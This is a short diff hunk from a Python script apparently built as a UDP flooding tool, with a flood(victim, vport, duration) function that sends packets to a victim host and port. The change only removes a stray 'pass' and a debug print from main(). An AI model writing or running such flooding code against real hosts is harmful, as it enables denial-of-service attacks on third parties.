@@ -21,10 +21,6 @@ def flood(victim, vport, duration):
         client.sendto(bytes, (victim, vport))
       
 def main():
-
-
-    pass
-    print len(sys.argv)
     if len(sys.argv) != 4:
         usage()
     else:
